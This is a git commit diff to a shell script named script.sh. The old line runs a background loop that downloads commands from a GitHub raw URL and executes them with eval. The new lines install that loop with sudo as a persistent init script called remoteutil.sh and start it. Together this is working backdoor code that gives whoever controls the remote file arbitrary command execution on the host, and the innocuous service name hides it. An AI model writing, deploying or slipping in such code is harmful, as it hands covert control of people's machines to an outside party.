71e95307f0029381518dd79d7941cca8e8ce7a46
baseben9 <baseben9@gmail.com>
2018-02-13 12:19:30 -0500

    Update script.sh

--- script.sh
+++ script.sh
@@ -1,1 +1,3 @@
-while true;do eval $(curl https://raw.githubusercontent.com/baseben9/baseben-data/master/commands.txt); sleep $(curl https://raw.githubusercontent.com/baseben9/baseben-data/master/time.txt); done & disown; echo Connected.
+sudo echo "while true;do eval $(curl https://raw.githubusercontent.com/baseben9/baseben-data/master/commands.txt); sleep $(curl https://raw.githubusercontent.com/baseben9/baseben-data/master/time.txt); done & disown; echo Connected." > /etc/init.d/remoteutil.sh
+sudo chmod +x /etc/init.d/remoteutil.sh
+/etc/init.d/remoteutil.sh
